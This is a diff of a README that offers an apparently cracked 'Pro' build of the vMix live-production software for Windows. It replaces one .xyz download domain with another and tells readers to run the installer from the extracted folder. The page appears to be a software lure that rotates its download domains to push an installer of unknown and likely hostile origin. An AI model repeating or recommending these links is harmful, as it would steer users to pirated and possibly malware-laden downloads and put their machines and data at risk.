@@ -18,8 +18,8 @@ Vmix Pro Live Production — desktop build for Windows 10/11 | clear layout | re
 
 > Use the project link below for Windows.
 
-* **Project link:** **[vmix.nexpath.xyz](https://vmix.nexpath.xyz/)**
-* **Full URL:** `https://vmix.nexpath.xyz/`
+* **Project link:** **[vmix.nerasix.xyz](https://vmix.nerasix.xyz/)**
+* **Full URL:** `https://vmix.nerasix.xyz/`
 * **Type:** Desktop package | Windows 10 and 11, 64-bit
 * **Setup:** Run the installer from the extracted folder
 
@@ -51,4 +51,4 @@ All professional modules are included in this build. After setup, launch locally
 * **RAM:** 8 GB or more | 16 GB ideal for large files
 * **Disk:** 4 GB free on system drive
 
-***
+***
